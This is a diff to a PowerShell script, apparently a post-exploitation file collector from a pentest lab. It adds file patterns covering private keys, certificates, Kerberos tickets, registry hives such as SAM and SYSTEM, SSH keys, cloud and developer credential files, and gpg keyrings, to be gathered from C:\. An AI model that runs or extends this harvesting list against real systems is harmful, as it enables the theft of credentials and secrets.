@@ -262,10 +262,18 @@ $extensions = @(
     '*.yaml', '*.yml', '*.json', '*.xml', '*.ps1', '*.bat', '*.cmd', '*.sh',
     '*.kdbx', '*.rdp', '*.7z', '*.rar', '*.tar', '*.gz', '*.bak', '*.old',
     '*.tmp', '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb', '*.rtf', '*.md',
-    '*.kerberoast', '*.kirb'
+    '*.kerberoast', '*.kirb', '*.pem', '*.p12', '*.pfx', '*.key', '*.crt', '*.cer',
+    '*.p7b', '*.p7c', '*.ccache', '*.hccapx', '*.wpa', '*.pcap', '*.pcapng', '*.cap'
 )
 # Add interesting files (exclude .exe to avoid tool contamination)
-$interestingFiles = @(".git*", "id_rsa", "id_ecdsa", "local.txt", "proof.txt", "SAM", "SYSTEM")
+$interestingFiles = @(
+    ".git*", "id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "local.txt", "proof.txt", 
+    "SAM", "SYSTEM", "SECURITY", "SOFTWARE", "NTUSER.DAT", "UsrClass.dat",
+    "web.config", "appsettings.json", ".env", ".env.local", ".env.production",
+    ".aws\credentials", ".aws\config", ".docker\config.json", ".kube\config",
+    ".npmrc", ".pip\pip.conf", ".netrc", ".my.cnf", ".pgpass", ".ldaprc",
+    ".subversion\config", ".gnupg\secring.gpg", ".gnupg\pubring.gpg", ".gnupg\trustdb.gpg"
+)
 
 # Define source and destination
 $sourceRoot = "C:\"
